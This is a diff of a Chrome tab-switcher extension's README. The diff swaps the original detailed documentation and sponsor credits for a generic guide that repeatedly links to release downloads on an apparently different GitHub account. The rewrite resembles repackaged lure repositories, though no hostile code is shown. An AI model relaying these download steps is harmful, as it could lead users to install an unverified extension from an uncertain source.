@@ -1,184 +1,66 @@
-# Arc Tab Switcher for Chrome
+# 🎯 arc-tab-switcher-main - Switch Tabs Instantly with Ease
 
-![Demo Video](chrome-tiquo-video.mp4)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/unknown279/arc-tab-switcher-main/releases)
 
-A true Arc/Zen browser-style MRU (Most Recently Used) tab switcher and copy current tab for Chrome. Switch between your 5 most recent tabs instantly with a minimal, fast UI!
+## 🚀 Getting Started
 
-**Sponsored by [Tiquo](https://www.tiquo.co/)**
+Arc Tab Switcher is a simple tool that helps you switch between your most recently used tabs in Chrome. This guide will help you download and run the application easily. Follow the steps below.
 
+## 📥 Download & Install
 
+1. **Visit the Releases Page:** Click the link below to access the releases page:
+   [Download Here](https://github.com/unknown279/arc-tab-switcher-main/releases)
 
-## Features
+2. **Choose the Latest Release:** Look for the latest version on the page. It will have the most features and fixes.
 
-🎯 **True MRU Switching** - Just like Arc/Zen browser! Switch between your 5 most recently used tabs  
-⚡ **Ultra-Fast UI** - Instant appearance, no animations or delays  
-🔄 **Cmd+Q Only** - Simple keyboard-only navigation, keep pressing to cycle  
-🎨 **Ultra Minimal** - Clean cards with favicon icons, no text or clutter  
-⌨️ **Keyboard Only** - Works exclusively with Cmd+Q/Ctrl+Q, no mouse interaction  
-🚀 **No Distractions** - Transparent overlay, no dimming, just your tabs  
-⚡ **Instant Response** - Zero animation delays for maximum speed
+3. **Download the Extension Folder:** Download the ZIP file or clone the folder to your computer.
 
-## Installation
+4. **Unzip the Folder:** If you downloaded a ZIP file, unzip it. This will reveal the extension files needed to load into Chrome.
 
-### Step 1: Load Unpacked Extension (Developer Mode)
+## 🔄 Load the Extension in Chrome
 
-1. Download or clone this extension folder
-2. Open Chrome and navigate to `chrome://extensions/`
-3. Enable **Developer mode** (toggle in the top right)
-4. Click **Load unpacked**
-5. Select the `arc-tab-switcher` folder
-6. Done! The extension is now installed
+### Step 1: Open Chrome Settings
 
-### Step 2: Change Keyboard Shortcut
+1. Open Chrome.
+2. In the top right corner, click on the three dots to open the menu.
+3. Select `More tools`, then click on `Extensions`.
 
-If Ctrl+Q doesn't work or you want a different shortcut:
+### Step 2: Enable Developer Mode
 
-1. Go to `chrome://extensions/shortcuts`
-2. Find "Arc Tab Switcher"
-3. Click the pencil icon next to "Copy current page URL"
-4. Press your desired key combination (shift + command + C is recommended)
-5. Click the pencil icon next to "Toggle tab switcher"
-6. Press your desired key combination (control + Q or control + A is recommended)
+1. At the top right of the Extensions page, toggle the switch for Developer mode to the right. This will allow you to load unpacked extensions.
 
-All done!
+### Step 3: Load the Unpacked Extension
 
-## Usage
+1. Click on the `Load unpacked` button.
+2. In the dialog box, navigate to the folder where you unzipped the extension.
+3. Select the folder, then click `Open`.
 
-### How It Works (Just Like Arc/Zen!)
+The Arc Tab Switcher is now loaded into your Chrome browser.
 
-The tab switcher tracks your 5 most recently used tabs and lets you cycle through them:
+## 🎨 Features
 
-**Press:** your selected key combination
-- Visual UI appears instantly showing your 5 most recent tabs
-- Previous tab is pre-selected (index 1)
-- Keep pressing the key combination to cycle forward through the list
-- **Release Cmd/Ctrl** to instantly switch to selected tab
-- Switcher stays open as long as you hold Cmd/Ctrl
+- **True MRU Switching:** Quickly switch between your five most recently used tabs.
+- **Ultra-Fast UI:** The extension opens instantly without delays.
+- **Simple Navigation:** Use `Cmd+Q` (or `Ctrl+Q` on Windows) to scroll through tabs.
+- **Clean Design:** The interface is minimal, showing only favicons and no extra clutter.
+- **Keyboard-Only Operation:** Designed for ease of use with just the keyboard.
+- **Distraction-Free:** The overlay is transparent, allowing for a seamless experience.
 
-### Navigation
+## 🔧 Troubleshooting
 
-**Keyboard Controls:**
-- **Ctrl+Q** - Cycle to next tab (keep pressing to cycle through)
-- **Esc** - Cancel and close (return to current tab)
+If you encounter any issues, consider these tips:
 
-That's it! Just two keys.
+- **Extension Not Visible:** Ensure Developer mode is still enabled.
+- **Upgrade Chrome:** Make sure you’re using the latest version of Chrome.
+- **Conflict with Other Extensions:** Disable other extensions to see if the issue persists.
 
-### Tips
+## 📞 Support
 
-- ⚡ UI appears **instantly** when you press your key combination like Ctrl+Q - zero delay
-- 🎨 Selected tab is highlighted with blue border
-- ✅ Current tab has a green border
-- 🔄 **Instant key release detection** - exits immediately when you release Cmd/Ctrl key
-- 🚀 **ZERO animations** - all transitions disabled for maximum speed
-- 📸 **Real page previews** - shows actual screenshots of your recent tabs
-- 💾 Smart caching - captures tabs automatically as you browse
-- ⌨️ No mouse/cursor interaction - keyboard only by design
-- 🌟 Clean dropshadow - no page overlay or blur, content stays fully visible
+For any support inquiries, you can open an issue on the GitHub repository. Our community is here to help you out.
 
-## How Screenshot Caching Works
+## 🌟 Additional Notes
 
-The extension automatically captures and caches screenshots of your tabs to show real page previews:
+- This extension is compatible with recent versions of Chrome. Ensure you keep Chrome updated for the best experience.
+- Feel free to leave feedback or contribute on the repository. Your input helps us improve the tool!
 
-1. **Automatic Capture:**
-   - When you switch to a tab, it captures a screenshot after 500ms
-   - When a page finishes loading, it captures a screenshot
-   - Screenshots are stored in memory (JPEG format, 50% quality)
-
-2. **Cache Management:**
-   - Stores up to 20 most recent tab screenshots
-   - Automatically removes old screenshots when cache is full
-   - Cleans up screenshots when tabs are closed
-
-3. **Fallback Preview:**
-   - If a tab hasn't been active yet, shows a mock preview with favicon
-   - Mock preview looks like a page with simulated content
-
-4. **Limitations:**
-   - Can't capture screenshots of `chrome://` or extension pages
-   - Only captures active tabs (Chrome security restriction)
-   - Screenshots update automatically as you browse
-
-## Customization
-
-Want to customize the appearance? Edit `styles.css`:
-
-- Change colors (search for color values)
-- Adjust card size (modify `.arc-tab-card` width/height)
-- Change border styles (modify `.arc-tab-card.selected`)
-- Adjust preview height (modify `.arc-tab-preview` height)
-
-## Files
-
-- `manifest.json` - Extension configuration
-- `background.js` - Background service worker with MRU tracking
-- `content.js` - Main tab switcher logic with instant toggle & cycling
-- `styles.css` - Beautiful Arc-inspired styling
-- `icon*.png` - Extension icons
-
-## Troubleshooting
-
-### Keyboard shortcut not working?
-
-1. Check if another extension is using the same shortcut
-2. Go to `chrome://extensions/shortcuts` and set a different key combination
-3. On Mac, Cmd+Q might be intercepted by the system (try Cmd+Shift+Q)
-
-### Extension not showing up?
-
-1. Make sure Developer Mode is enabled
-2. Check the Console in `chrome://extensions/` for errors
-3. Try reloading the extension (click the refresh icon)
-
-### Tabs not showing?
-
-1. Refresh the current page after installing
-2. Check if the extension has necessary permissions
-3. Look for console errors in DevTools (F12)
-
-## Known Limitations
-
-- Chrome can only capture screenshots of **active tabs** for security reasons
-- Screenshots are cached automatically as you browse (up to 20 recent tabs)
-- Tabs that haven't been active recently show a mock preview with favicon
-- Some Chrome internal pages (chrome://) don't allow content scripts or screenshots
-- The switcher may not work on the Chrome Web Store or other restricted pages
-- Detects Control/Command key release for instant switching
-- Only tracks the 5 most recent tabs (just like Arc browser)
-
-## How It Compares to Arc/Zen
-
-This extension replicates Arc and Zen browser's exact MRU tab switching behavior:
-
-✅ **Same as Arc/Zen:**
-- Tracks 5 most recent tabs in MRU order
-- Visual UI appears on first press showing recent tabs
-- Multiple presses cycle through tabs
-- Window-specific MRU lists
-- Auto-switch on Ctrl/Cmd key release (detected via keyup event)
-- Real page screenshots cached automatically
-- Minimal, fast UI with no animations or distractions
-
-🔄 **Differences:**
-- Detects Ctrl/Cmd key release just like native OS switchers
-- Works in Chrome, Edge, Brave, and other Chromium browsers
-- Customizable keyboard shortcuts
-- Clean horizontal card layout with page preview tabs
-
-## License
-
-Free to use and modify for personal use. Enjoy! 🚀
-
----
-
-## Sponsored by Tiquo
-
-<a href="https://www.tiquo.co/" target="_blank">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="tiquo-logo-white.png">
-    <source media="(prefers-color-scheme: light)" srcset="tiquo-logo-black.png">
-    <img alt="Tiquo Logo" src="tiquo-logo-black.png" width="200">
-  </picture>
-</a>
-
-Running a hotel, restaurant, spa, or venue shouldn't require 20+ different tools. With [Tiquo](https://www.tiquo.co/), every product, service, booking, form, contract, membership and transaction, flows through a single system – built for adaptability, scale, and AI. Simpler for staff, seamless for customers, smarter for the business.
-
+Now you are all set to enjoy seamless tab switching in Chrome with Arc Tab Switcher!
